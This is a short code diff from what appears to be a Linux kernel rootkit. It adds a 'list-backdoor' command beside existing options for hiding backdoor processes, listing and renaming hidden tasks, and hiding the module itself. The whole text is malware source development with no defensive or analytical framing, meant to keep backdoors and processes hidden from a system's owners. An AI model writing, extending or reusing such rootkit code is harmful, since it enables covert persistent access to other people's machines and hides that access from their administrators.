@@ -427,8 +427,9 @@ enum {
 
 	/** task (PID) operations */
 	Opt_hide_task_backdoor,
-	Opt_list_hidden_tasks, //-s
-	Opt_list_all_tasks, //-S
+	Opt_list_hidden_tasks,
+	Opt_list_all_tasks,
+	Opt_list_back_door,
 	Opt_rename_hidden_task,
 
 	/** this module stealth */
@@ -459,6 +460,7 @@ static const match_table_t tokens = {
 	{ Opt_hide_task_backdoor, "hide-task-backdoor=%d" },
 	{ Opt_list_hidden_tasks, "list-hidden-tasks" },
 	{ Opt_list_all_tasks, "list-all-tasks" },
+	{ Opt_list_back_door, "list-backdoor" },
 	{ Opt_rename_hidden_task, "rename-task=%d,%s" },
 
 	{ Opt_hide_module, "hide-lkm" },
@@ -541,6 +543,9 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			break;
 		case Opt_list_hidden_tasks:
 			kv_show_saved_tasks();
+			break;
+		case Opt_list_back_door:
+			kv_show_active_backdoors();
 			break;
 		case Opt_rename_hidden_task:
 			if (sscanf(args[0].from, "%d", &pid) == 1)
